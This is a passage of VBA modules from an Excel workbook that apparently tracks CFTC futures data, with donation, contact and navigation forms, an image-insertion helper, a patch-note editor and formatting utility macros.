    Set dict_pObjectKeys = New Collection
#Else
    Set dict_pDictionary = CreateObject("Scripting.Dictionary")
#End If
End Sub

Private Sub Class_Terminate()
#If Mac Or Not UseScriptingDictionaryIfAvailable Then
    Set dict_pKeyValues = Nothing
    Set dict_pObjectKeys = Nothing
#Else
    Set dict_pDictionary = Nothing
#End If
End Sub
Attribute VB_Name = "Donation"
Attribute VB_Base = "0{75F95789-6309-4EC8-88A2-AE1F4E9CB9CC}{3B5B7C88-BC88-4D52-A351-3EC5A6BC24DB}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Private Sub UserForm_Initialize()

With Me

    .Pay_Pal.BackColor = RGB(3, 180, 235)
    .Patreon.BackColor = RGB(249, 203, 111)
    
    With .About_Me
        '.BackColor = RGB(253, 224, 220)
        .Caption = "Dear User ," & vbNewLine & "I'm a university student dealing with a student loan to payoff pretty soon." & _
                    " Luckily I live in Canada so it isn't exorbitantly large, but it's sizeable enough that I'm concerned about it." & _
                    " Fortunately I've developed a bit of skill in programming and in my spare time have applied it to something that has helped me over the years and I hope you'll find it useful as well in your endeavours to becoming a more profitable investor or trader." & _
                    " With that said, all donations will go towards paying off my debt and of course the continued development of this project, so if you are able to, I would greatly appreciate anything you are able to spare." & vbNewLine & vbNewLine & _
                    " Sincerely," & vbNewLine & Chr(9) & "    MoshiM"
        
        '.BackColor = RGB(211, 230, 230)
        
    End With
    
End With

End Sub
Private Sub Patreon_Click()

ActiveWorkbook.FollowHyperlink "https://www.patreon.com/MoshiM"

Unload Me

End Sub
Private Sub Pay_Pal_Click()

ActiveWorkbook.FollowHyperlink "https://paypal.me/MoshiMDonation?locale.x=en_US"

Unload Me

End Sub

Attribute VB_Name = "E_Mail"
Attribute VB_Base = "0{E93EF704-67EA-4AE6-A0A9-59F2F5A9482B}{A481716D-5FF7-4C0F-A15A-7252992B8F80}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Private Sub Send_Message_Click()

Dim Body As String, Subject As String

Const SendTo As String = "MoshiM_UC@outlook.com"

Body = E_Mail.Body.Text
Subject = E_Mail.Subject.Text

SendEmailFromOutlook Body, Subject, SendTo, vbNullString, vbNullString

Unload Me

End Sub
Private Sub UserForm_Initialize()

With Me.MS_Outlook

    .BackColor = RGB(252, 214, 108)
    
    .Caption = "MS Outlook desktop application required. " & _
                "Having an @outlook email address isn't necessary, but please ensure that you are logged in and have verified your account." & _
                vbNewLine & "If you don't recieve a reply or don't want to download MS outlook, then I can be reached at MoshiM_UC@outlook.com" & _
                vbNewLine & vbNewLine & "Read the ReadMe file for additional methods of contacting me."
End With

End Sub
Attribute VB_Name = "Form_Selection"
Attribute VB_Base = "0{52EA819C-8EFD-4383-BFC0-64D7C4BFDD57}{15132FFC-6DD0-49A9-A380-9F05A21AD9CF}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub Feedback_Click()
    ThisWorkbook.FollowHyperlink "https://forms.gle/6DjTA1UuL8XG58WE8"
End Sub
Private Sub Google_Email_Click()
    ThisWorkbook.FollowHyperlink "https://forms.gle/nfntQQp6QSgLDdQW7"
    Unload Me
End Sub
Private Sub Mail_Click()

    E_Mail.Show
    Unload Me
    
End Sub
Private Sub Google_Email_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    
    Turn_Green Google_Email
    
End Sub
Private Sub Feedback_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    
     Turn_Green Feedback
     
End Sub
Private Sub Mail_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    
    Turn_Green Mail
    
End Sub
Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)

    Dim BT As Control
    
    For Each BT In Me.Controls
    
        If TypeOf BT Is MSForms.CommandButton And BT.BackColor <> RGB(255, 255, 255) Then BT.BackColor = RGB(255, 255, 255)  'white
        
    Next BT
        
End Sub
Private Sub Turn_Green(BT As MSForms.CommandButton)

Dim CT As Control

For Each CT In Me.Controls

    If TypeOf CT Is MSForms.CommandButton Then
        With CT
            If CT Is BT Then
                 If .BackColor <> RGB(211, 240, 224) Then .BackColor = RGB(211, 240, 224) 'turn the commandbutton green
            Else
                 If .BackColor <> RGB(255, 255, 255) Then .BackColor = RGB(255, 255, 255) 'turn the command button white
            End If
       End With
    End If

Next

End Sub
Attribute VB_Name = "GBP"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "HUB"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Control = "Sheet_Selection, 1, 0, MSForms, ComboBox"
Private Sub Range_Zoom()

Dim RR As Range

With Me.Shapes("Object_Group").TopLeftCell 'A5

    If UUID Then
        Set RR = .Resize(Rowsize:=19, ColumnSize:=5)
    Else
        Set RR = .Resize(Rowsize:=16, ColumnSize:=6)
    End If
End With

Call ZoomToRange(ZoomThisRange:=RR, PreserveRows:=True)

End Sub
Private Sub Worksheet_Activate()

Range_Zoom

#If Mac Then 'show Navigation Userform if on A MAC
    
    Dim UForm As Object
    
    For Each UForm In VBA.UserForms
        
        If UForm Is Navigation Then Exit Sub 'exit sub if Navigation is open
        
    Next UForm
    
    Navigation.Show

#Else
    
    If ThisWorkbook.Last_Used_Sheet Is Nothing Then Me.Sheet_Selection.Activate 'if not saving
    
#End If

End Sub
Private Sub Sheet_Selection_GotFocus()

Dim SavedW As Boolean
   
With ThisWorkbook

    SavedW = .Saved
    
    Me.Sheet_Selection.Text = vbNullString
    
    .Saved = SavedW

End With

End Sub
Private Sub Sheet_Selection_LostFocus()

Dim SavedW As Boolean

With ThisWorkbook
    
    SavedW = .Saved
    
    If .Procedure_Active = False And ThisWorkbook.ActiveSheet Is HUB Then
    
        Sheet_Selection.Text = "Sheet Selection"
        
    ElseIf .Procedure_Active = True Then
    
            .Procedure_Active = False
    End If
    
    .Saved = SavedW
    
End With

End Sub
Private Sub Worksheet_Deactivate()

Dim SavedW As Boolean

#If Mac Then

#Else

    SavedW = ThisWorkbook.Saved
    
    With Me.Sheet_Selection
    
        If .Text <> vbNullString And .Text <> "Sheet Selection" Then
            
            ThisWorkbook.Procedure_Active = True
            
            .Text = vbNullString

        End If
        
    End With
    
    ThisWorkbook.Saved = SavedW
    
#End If

End Sub
Private Sub Sheet_Selection_Click()
    On Error Resume Next
    ThisWorkbook.Worksheets(Me.Sheet_Selection.Value).Activate
End Sub
Private Sub Forms()
    Form_Selection.Show
End Sub
Private Sub DN_Click()
    Donation.Show ': Cancel = True
End Sub
Private Sub U_Data_Click()
    Weekly.Activate
End Sub
Private Sub Usage_Notes_Click()
    User_Notes.Show
End Sub
Private Sub Organize_HUB()

Dim SHP As Shape, Top_Range As Range

Set Top_Range = Me.Range("A4")

For Each SHP In Shapes("object_group").GroupItems
    If Not SHP Is Me.Sheet_Selection Then SHP.Height = Shapes("my_date").Height

Next

With Shapes("background")

    .Top = Shapes("Object_Group").Top
    .Width = Shapes("donate").Width
    .Left = Shapes("donate").Left
    
End With

With Shapes("my_date")
    .Left = Top_Range.Left
    .Width = Shapes("background").Left
End With

With Shapes("notes")
    .Left = Shapes("my_date").Left
    .Top = Shapes("my_date").Top + Shapes("my_date").Height
    '.Width = Shapes("Update").Left - Shapes("My_Date").Left ' - Shapes("Update").Width - Shapes("notes").Width
End With

With Shapes("update")
    .Left = Shapes("notes").Left + Shapes("notes").Width
    .Top = Shapes("notes").Top
    '.Width = Shapes("My_Date").Width - Shapes("Update").Width - Shapes("notes").Width
End With

With Shapes("DONATE")
    .Left = Shapes("Update").Left + Shapes("Update").Width
    .Top = Shapes("notes").Top
    '.Width = Shapes("My_Date").Width + - Shapes("Update").Width - Shapes("notes").Width
End With

With HUB.Sheet_Selection
    .Left = Shapes("my_date").Left
    .Top = Shapes("notes").Top + Shapes("notes").Height
    .Width = Shapes("my_date").Width
'    .Height = Shapes("Unlock_P").Height
End With

With Shapes("DN_List")
    .Left = HUB.Sheet_Selection.Left
    .Top = HUB.Sheet_Selection.Top + HUB.Sheet_Selection.Height
End With

With Shapes("Unlock_P")
    .Top = Shapes("DONATE").Top + Shapes("DONATE").Height
    .Left = Shapes("DONATE").Left
    .Width = Shapes("DONATE").Width
    .Height = Me.Sheet_Selection.Height
End With

With Shapes("Feedback")
    .Left = Shapes("Unlock_P").Left
    .Top = Shapes("Unlock_P").Top
    .Width = Shapes("Unlock_P").Width
    .Height = Shapes("Unlock_P").Height
End With

With Me.Shapes("Object_Group")

    .Top = Top_Range.Top
    .Left = Top_Range.Left

End With

With Me.Shapes("Macro_Check")
    .Top = Top_Range.Top
    .Left = Top_Range.Left
End With

End Sub

'https://forms.gle/nfntQQp6QSgLDdQW7 - Add email google form
Attribute VB_Name = "Input_Directory"
Attribute VB_Base = "0{E5A216B6-6D1F-423C-8DFA-0CF7F0B50B3A}{E1DFC09A-914F-4B7A-9C61-9D3C56BED7AD}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False

Private Sub UserForm_Initialize()

With Me
    
    .Text_Input.SetFocus
    
    .Caption = "Current number of shapes :  " & Variable_Sheet.Shapes.count - 1
    
    .Waifu_Images.Value = True 'sets default option to Images
    
End With

End Sub
Private Sub Text_Input_KeyPress(ByVal KeyAscii As MSForms.ReturnInteger)
    If KeyAscii = 27 Then Unload Me
End Sub
Private Sub Text_Input_Exit(ByVal Cancel As MSForms.ReturnBoolean)

    Me.Text_Input.BackColor = RGB(248, 248, 248)
    
'    With ThisWorkbook
'        .Procedure_Active = True
'        Me.Text_Input.Text = "S-Tier"
'        .Procedure_Active = False
'    End With
    
End Sub
Private Sub Text_Input_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
    'Me.Text_Input.BackColor = RGB(255, 153, 0)
    
    With ThisWorkbook
        .Procedure_Active = True
        Me.Text_Input.Text = vbNullString
        .Procedure_Active = False
    End With
    
End Sub
Private Sub Waifu_Images_Click()

Dim X As Long

With Me

    With .Waifu_Images
    
        .BackColor = RGB(255, 153, 0)
        .ForeColor = RGB(0, 0, 0)
    
    End With

    For X = 0 To .Controls.count - 1

        If TypeOf .Controls(X) Is MSForms.OptionButton And Not .Controls(X) Is Waifu_Images Then

            With .Controls(X)

                .BackColor = RGB(248, 248, 248)
                .ForeColor = RGB(0, 0, 0)

            End With

        End If

    Next X
    
    .Text_Input.SetFocus
    
End With

End Sub
Private Sub Waifu_Insert_Click()

Dim X As Long

With Me

    With .Waifu_Insert
    
        .BackColor = RGB(255, 153, 0)
        .ForeColor = RGB(0, 0, 0)
    
    End With

    For X = 0 To .Controls.count - 1

        If TypeOf .Controls(X) Is MSForms.OptionButton And Not .Controls(X) Is Waifu_Insert Then

            With .Controls(X)

                .BackColor = RGB(248, 248, 248)
                .ForeColor = RGB(0, 0, 0)

            End With

        End If

    Next X
    
    .Text_Input.SetFocus
    
End With

End Sub
Private Sub Wallpapers_OB_Click()

Dim X As Long

With Me

    With .Wallpapers_OB
    
        .BackColor = RGB(255, 153, 0)
        .ForeColor = RGB(0, 0, 0)
    
    End With

    For X = 0 To .Controls.count - 1
        
        If TypeOf .Controls(X) Is MSForms.OptionButton And Not .Controls(X) Is Wallpapers_OB Then
        
            With .Controls(X)
            
                .BackColor = RGB(248, 248, 248)
                .ForeColor = RGB(0, 0, 0)
                
            End With
        
        End If
    
    Next X
    
    .Text_Input.SetFocus
    
End With

End Sub
Private Sub Text_Input_Change()

Dim Folder_Path As String, File_Name As String, My_Macros As Shape ', SC As New Collection

If ThisWorkbook.Procedure_Active = True Then Exit Sub

Application.EnableEvents = False
ThisWorkbook.Procedure_Active = True

Dim TB As Range

With Me

    If .Wallpapers_OB.Value = True Then
    
        Set TB = Variable_Sheet.ListObjects("Wallpapers").DataBodyRange
        
    ElseIf .Waifu_Images.Value = True Or .Waifu_Insert.Value = True Then
    
        Set TB = Variable_Sheet.ListObjects("Waifus").DataBodyRange
        
    End If
    
    With .Text_Input
        File_Name = .Text 'store textbox value in variable
        .Text = vbNullString 'clear textbox
    End With
    
End With

If File_Name <> vbNullString And File_Name <> " " Then 'if text box has something in it

    Apply_Dir Selected_Range:=TB, INPT:=File_Name 'apply text to the specified table if it doesn't exist

    If Me.Waifu_Insert.Value = True Then 'if this option button is on, then insert image to sheet
        
        Folder_Path = Environ("USERPROFILE") & "\Desktop\Images\Foo\"
        
        If Dir(Folder_Path & File_Name) <> vbNullString Then 'if the file has downloaded to the specified location
            
            Application.ScreenUpdating = False
            
            With Variable_Sheet
            
                On Error Resume Next
                
                Set My_Macros = .Shapes(File_Name) 'This is a temporary hold for error checking
                
                If Err.Number <> 0 Then 'if shape with that name doesn't exist then
                
                    On Error GoTo 0
                    
                    Set My_Macros = .Shapes("Macros")
                
                    With .Pictures.Insert(Folder_Path & File_Name)  'insert picture to variable_sheet
                    
                        .Name = File_Name 'rename the shape using the file name provided by the Text Box
                        .Top = My_Macros.Top + My_Macros.Height 'place all shapes below My_Macros
                        .Left = My_Macros.Left
                        
                    End With
                
                Else 'if shape already exists within the shapes collection
                    Err.Clear
                    Me.Boo.BackColor = RGB(249, 203, 111) 'Yellow color
                End If
                 Me.Caption = "Current number of shapes :  " & .Shapes.count - 1
            End With
           
            Application.ScreenUpdating = True
            
        Else 'if file wasn't found [YET]?
            Me.Boo.BackColor = RGB(233, 137, 174) 'Purple color
        End If

    End If
    
Else 'if text box is empty or equal to a space

    Me.Boo.BackColor = RGB(109, 217, 251) 'blue color
    
End If

ThisWorkbook.Procedure_Active = False
Application.EnableEvents = True

End Sub
Private Sub Apply_Dir(Selected_Range As Range, INPT As String)

Dim Target_Range As Range

If Selected_Range.Find(INPT) Is Nothing Then 'if input isn't found within the table

    With Selected_Range
                  
        Set Target_Range = .Find(vbNullString) 'Find first empty cell
        
        If Target_Range Is Nothing Then 'IF an empty cell isn't found then go to a new row
           
            Set Target_Range = .Cells(.Rows.count, 1).Offset(1, 0)
            
        End If
    
    End With
    
    With Target_Range
        .Value2 = INPT 'apply value to target_range
    End With
    
    Me.Boo.BackColor = RGB(0, 176, 80) 'green
    
Else

    Me.Boo.BackColor = RGB(237, 88, 84) 'red
    
End If

End Sub

Attribute VB_Name = "JPY"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Misc"
'Private Sub My_Resize()
'
'    Dim HUB_Name() As Variant, Item As Variant, WSC As Range
'
'    Application.ScreenUpdating = False
'
'    HUB_Name = Variable_Sheet.ListObjects("Table_WSN").DataBodyRange.Columns(3).Value2
'
'
'    For Each Item In HUB_Name
'
'        With ThisWorkbook.Worksheets(Item).Range("A3").ListObject
'
'
'        .DataBodyRange.Rows(.DataBodyRange.Rows.Count).ClearContents
'        .Resize .Range.CurrentRegion
'        End With
'
'    Next Item
'
'    With Application
'    '    .CutCopyMode = False
'        .ScreenUpdating = True
'    End With
'
'End Sub
Private Sub Change_Background() 'For use on the HUB worksheet
    
Dim fNameAndPath As Variant

fNameAndPath = Application.GetOpenFilename(, Title:="Select Background_Image. If no image is selected, background will not be changed")
'above line returns a string
If Not fNameAndPath = False Then

    HUB.SetBackgroundPicture Filename:=fNameAndPath

End If

End Sub
Sub ActiveSheet_Formats_Copy()
Attribute ActiveSheet_Formats_Copy.VB_Description = "Copy Formats [Conditional]  from the activesheet to the other sheets in the current workbook."
Attribute ActiveSheet_Formats_Copy.VB_ProcData.VB_Invoke_Func = " \n14"

Dim HUB_Name As Variant, I As Long, TS As Worksheet, ASH As Worksheet

With Application

   .ScreenUpdating = False

On Error GoTo Invalid_Function

    HUB_Name = .Index(.Run("'" & ActiveWorkbook.Name & "'!Get_Worksheet_Info"), 0, 2)

On Error GoTo 0

End With

Set ASH = ActiveWorkbook.ActiveSheet

CFTC_Table(ActiveWorkbook, ASH).DataBodyRange.Copy
    
For I = LBound(HUB_Name, 1) To UBound(HUB_Name, 1)

    Set TS = ActiveWorkbook.Worksheets(HUB_Name(I, 1))
    
    If Not TS Is ASH Then
    
        With TS
    
            .Cells.FormatConditions.Delete
            
            CFTC_Table(ActiveWorkbook, TS).DataBodyRange.PasteSpecial Paste:=xlPasteFormats, Operation:=xlNone, _
            SkipBlanks:=False, Transpose:=False
            
        End With
        
    End If
    
Next I

With Application

    .ScreenUpdating = True
    .CutCopyMode = False
    
End With

Exit Sub

Invalid_Function:
    MsgBox "Function Get_Worksheet_Info is unavailable. This Macro is intended for files created by MoshiM." & vbNewLine & vbNewLine & _
    "If you see this message and one of my files is the Active Workbook then please contact me."

End Sub
Sub ToTheHub()
Attribute ToTheHub.VB_Description = "CTRL+B : Go to the HUB."
Attribute ToTheHub.VB_ProcData.VB_Invoke_Func = "b\n14"
     HUB.Activate
End Sub
Sub To_Charts()
Attribute To_Charts.VB_Description = "CTRL+SHIFT+B : Navigate to Charts"
Attribute To_Charts.VB_ProcData.VB_Invoke_Func = "B\n14"
    Chart_Sheet.Activate
End Sub
Sub Navigation_Userform()
Attribute Navigation_Userform.VB_Description = "CTRL+SHIFT+C"
Attribute Navigation_Userform.VB_ProcData.VB_Invoke_Func = "C\n14"

Dim UForm As UserForm

For Each UForm In VBA.UserForms

    If UForm Is Navigation Then
    
        Unload Navigation
        Exit Sub
    End If

Next UForm
    
    Navigation.Show
    
End Sub
Sub Column_Visibility_Form()
Attribute Column_Visibility_Form.VB_Description = "Hide or Unhide columns in This Workbook"
Attribute Column_Visibility_Form.VB_ProcData.VB_Invoke_Func = " \n14"

    Column_Visibility.Show

End Sub
Private Sub Hide_Workbooks()

Dim WB As Workbook

For Each WB In Application.Workbooks
    If Not WB Is ActiveWorkbook Then WB.Windows(1).Visible = False
Next

End Sub
Private Sub Show_Workbooks()

Dim WB As Workbook

For Each WB In Application.Workbooks
    If Not WB Is ActiveWorkbook Then WB.Windows(1).Visible = True
Next

End Sub



Attribute VB_Name = "Model_S"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "NZD"
Attribute VB_Base = "0{00020820-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Attribute VB_Name = "Navigation"
Attribute VB_Base = "0{A9D5709C-780F-4826-AF5F-59C20A8F1A9C}{8D49154A-0B92-4804-AA4D-B4DC8249ECB0}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
'Public Entered_White As Boolean
'Public Entered_Green As Boolean
Private Sub CL_Field_Click()

With Me.S_Selection
    .Text = vbNullString
    .SetFocus
End With

End Sub
Private Sub UserForm_Initialize()

Application.Run "'" & ThisWorkbook.Name & "'!Update_List", Me.S_Selection, , True

End Sub
Private Sub WS_Click()
    ThisWorkbook.Worksheets(Me.S_Selection.Value).Activate
End Sub
Private Sub CH_Click()

With Application

    .EnableEvents = False: .ScreenUpdating = False: ThisWorkbook.Procedure_Active = True
    
    .Run "'" & ThisWorkbook.Name & "'!Update_Charts", Me.S_Selection.Value 'update the charts

    If Not ThisWorkbook.ActiveSheet Is Chart_Sheet Then Chart_Sheet.Activate 'activate Chart_Sheet
    
    #If Mac Then
    
    #Else
    
        Chart_Sheet.Sheet_Selection.Text = Me.S_Selection.Text 'combox events are off thanks to the procedure_active boolean
        
    #End If
   
    .EnableEvents = True: .ScreenUpdating = True: ThisWorkbook.Procedure_Active = False
       
End With

End Sub
Private Sub WS_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)
 
With Me

'    If .Entered_Green = True Then Exit Sub
'
'    .Entered_White = False
'    .Entered_Green = True
    Turn_Green WS
    
End With
    
End Sub
Private Sub CH_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)

With Me

'    If .Entered_Green = True Then Exit Sub
'
'    .Entered_White = False
'    .Entered_Green = True
    Turn_Green CH
    
End With

End Sub
Private Sub CL_Field_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)

With Me

' If .Entered_Green = True Then Exit Sub
'
'    .Entered_White = False
'    .Entered_Green = True
    Turn_Green CL_Field
    
End With
    
End Sub
Private Sub UserForm_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)

With Me
'
'    If .Entered_White = True Then Exit Sub
'
'    .Entered_Green = False
'    .Entered_White = True
    
    If .CL_Field.BackColor <> RGB(255, 255, 255) Then .CL_Field.BackColor = RGB(255, 255, 255)
    If .CH.BackColor <> RGB(255, 255, 255) Then .CH.BackColor = RGB(255, 255, 255)
    If .WS.BackColor <> RGB(255, 255, 255) Then .WS.BackColor = RGB(255, 255, 255)
    
End With

End Sub
Private Sub Turn_Green(BT As MSForms.CommandButton)

Dim CT As Control

For Each CT In Me.Controls

    If TypeOf CT Is MSForms.CommandButton Then
        With CT
            If CT Is BT Then
                 If .BackColor <> RGB(211, 240, 224) Then .BackColor = RGB(211, 240, 224) 'turn the commandbutton green
            Else
                 If .BackColor <> RGB(255, 255, 255) Then .BackColor = RGB(255, 255, 255) 'turn the command button white
            End If
       End With
    End If

Next

End Sub

Attribute VB_Name = "Patch_Note_Update"
Attribute VB_Base = "0{518A2F71-E582-49A6-BAD8-643035FBC406}{2BF86369-6C4D-445E-A1BA-3D37812D51B6}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Private Sub Submit_Click()

Dim Update_Range As Range, File_Type As String, Path As String, X As Byte, TT As Byte, Body As String, _
ARRS() As String, Add() As String, Y As Long, BB As Long, YY As Long, AA As Long, D_Dict As New Dictionary, _
B_Dict As Dictionary, Key As Variant, Item As Variant, APP As String

Const FileN As String = "\Futures and Options Combined\Patch_Notes.txt"
    
File_Type = Variable_Sheet.ListObjects("Saved_Variables"). _
    DataBodyRange.Find("Type", LookIn:=xlValues, LookAt:=xlWhole).Offset(0, 1).Value2

Path = Environ("ONEDRIVE") & FileN

X = Application.Match(File_Type, Array("L", "D", "T"), 0) - 1 'designate location within array

TT = FreeFile

Open Path For Input As #TT 'open text file and retrieve string
   Body = Input(LOF(TT), #TT)
Close #TT

If Me.AP_All.Value = True Then 'Determines whether or not to add patch not to all or just one files patch notes
    BB = 0: AA = 2
Else
    BB = X: AA = X
End If

Add = Split(Me.TX_B.Text, vbNewLine) 'creates an array from each line of the supplied Patch_Note
    
For Y = 0 To UBound(Add) 'tab & bullet & text...[Loop through each line of the supplied patch_note

    If LCase(Add(Y)) = "uwd" Then 'stands for "updated weekly data"
        
        Add(Y) = Now & " MST: Updated Weekly Data. Download is unnecessary unless other notes are added."
    
    End If
    
    Add(Y) = Chr(9) & Chr(149) & Add(Y)

Next Y

ARRS = Split(Body, "<>") 'split the array with <>

Add(0) = Join(Add, vbNewLine) 'rejoin string and separate with a new line

For YY = BB To AA 'can be each patch note section or just one

    Body = vbNullString
    
    SS = Split(ARRS(YY), vbNewLine)
    
    For Y = 0 To UBound(SS) 'create dictionary of all patch notes by date
    
        If SS(Y) <> vbNullString And InStr(1, SS(Y), Chr(149)) = 0 And Not D_Dict.Exists(SS(Y)) Then 'if date and doesn't exist within dictionary
        
            Set B_Dict = New Dictionary                            'then create dictionary with date as key
        
            D_Dict.Add SS(Y), B_Dict
            
        ElseIf SS(Y) <> vbNullString And InStr(1, SS(Y), Chr(149)) > 0 Then
            
            B_Dict.Add Y, SS(Y)
            
        End If
        
    Next Y
    
    If D_Dict.Exists("*" & Date) Then 'Appending the new addition if today's date exists
    
        D_Dict.Item("*" & Date).Add "Addition", Add(0)
    
    Else 'appending if today's date doesn't exist
    
        Set B_Dict = New Dictionary
        
        D_Dict.Add "*" & Date, B_Dict
        
        B_Dict.Add "Addition", Add(0)
        
    End If
    
    Body = "*" & Date & vbNewLine & vbNewLine

    For Each Item In D_Dict.Item("*" & Date).Items 'ensures most recent stuff is first
        
        Body = Body & Item & vbNewLine
    
    Next Item
    
    Body = Body & vbNewLine
    
    For Each Key In D_Dict.Keys 'populate patch note string for the current file
    
        If Key <> "*" & Date Then
                
            Body = Body & Key & vbNewLine & vbNewLine
            
            For Each Item In D_Dict.Item(Key).Items
                
                Body = Body & Item & vbNewLine
            
            Next Item
            
            Body = Body & vbNewLine
             
        End If
            
    Next Key
    
    ARRS(YY) = Body
    
    D_Dict.RemoveAll
    
    Set B_Dict = Nothing
    
Next YY

Body = Join(ARRS, "<>")

Open Path For Output As #TT 'open text file and retrieve string
    Print #TT, Body
Close #TT

Me.TX_B.Text = vbNullString

End Sub
Attribute VB_Name = "Progress_Bar"
Attribute VB_Base = "0{D1255CA4-A962-4D76-AB6C-BDD6072E8C26}{4FEFEB6D-0A75-4B5D-B053-09FF68339865}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Attribute VB_Name = "Public_Functions"
Sub SendEmailFromOutlook(Body As String, Subject As String, toEmails As String, ccEmails As String, bccEmails As String)
    Dim outApp As Object
    Dim outMail As Object
    On Error GoTo No_Outlook
    
    Set outApp = CreateObject("Outlook.Application")
    Set outMail = outApp.CreateItem(0)
 
    With outMail
        .To = toEmails
        .CC = ccEmails
        .BCC = bccEmails
        .Subject = Subject
        .HTMLBody = Body
        .send 'Send the email
    End With
 
    Set outMail = Nothing
    Set outApp = Nothing
    
    Exit Sub
    
No_Outlook:
    MsgBox "Microsoft Outlook isn't installed."
End Sub
Sub Re_Enable()
Attribute Re_Enable.VB_Description = "Use if things seem odd"
Attribute Re_Enable.VB_ProcData.VB_Invoke_Func = " \n14"

    With Application
        .Calculation = xlCalculationAutomatic
        .ScreenUpdating = True
        .DisplayStatusBar = True
        .EnableEvents = True
    End With

End Sub

Sub Remove_CFormats()
Attribute Remove_CFormats.VB_Description = "Remove all Formats from the current Worksheet"
Attribute Remove_CFormats.VB_ProcData.VB_Invoke_Func = "X\n14"
'
' Delete_Conditional_Formats__On_Worksheet Macro
'
' Keyboard Shortcut: Ctrl+Shift+X
    Cells.FormatConditions.Delete

End Sub
Sub ZoomToRange(ByVal ZoomThisRange As Range, _
    ByVal PreserveRows As Boolean)
Application.ScreenUpdating = False
Dim Wind As Window

Set Wind = ActiveWindow

Application.GoTo ZoomThisRange.Cells(1, 1), True

With ZoomThisRange
    If PreserveRows = True Then
        .Resize(.Rows.count, 1).Select
    Else
        .Resize(1, .Columns.count).Select
    End If
End With

With Wind
    .Zoom = True
    .VisibleRange.Cells(1, 1).Select
End With

    If Not ActiveWorkbook.Last_Used_Sheet Is Nothing And UUID Then 'accounting for if the variable has not been declared for normal use
        'do nothing
    Else
        Application.ScreenUpdating = True

    End If

End Sub
Public Function Change_Delimiter_Not_Between_Quotes(ByRef Current_String As Variant, ByVal Delimiter As String, Optional ByVal Changed_Delimiter As String = ">|fffd|")
    
'returns a 0 based array 1D array
    
Dim String_Array() As String, X As Long, S2 As String

S2 = Right(Changed_Delimiter, 1)

On Error GoTo 0

    If InStr(1, Current_String, Chr(34)) = 0 Then 'if there are no quotation marks
        
        Change_Delimiter_Not_Between_Quotes = Split(Current_String, Delimiter)
        Exit Function

    End If
    'Replace ALL quotation marks with ChangedDelimiter[Quotation mark] EX: ",  --> +$+
    
    Current_String = Replace(Current_String, Chr(34), Changed_Delimiter)

    String_Array = Split(Current_String, Left(Changed_Delimiter, 1)) '1st character of Changed_Delimiter is used to delimit
    'element [0] will be an empty string if the first value in the delmited string begins with a Quotation mark.
    For X = LBound(String_Array) To UBound(String_Array)

        If Left(String_Array(X), 1) = S2 And Not Left(String_Array(X), 2) = S2 & Delimiter Then
            'If the string contains a valid comma
            'Checked by if [the First character is the 2nd Character in the Changed Delimiter] and the 2nd character isn't the delimiter
            'Then offset the string by 1 character to remove the 2nd portion of the changed Delimiter
            String_Array(X) = Right(String_Array(X), Len(String_Array(X)) - 1)
        
        Else
        
            If Left(String_Array(X), 1) = S2 Then 'If 1st character = to 2nd portion of the changed delimiter
                                                  'Then offset string by 1 and then repalce all [Delimiter]
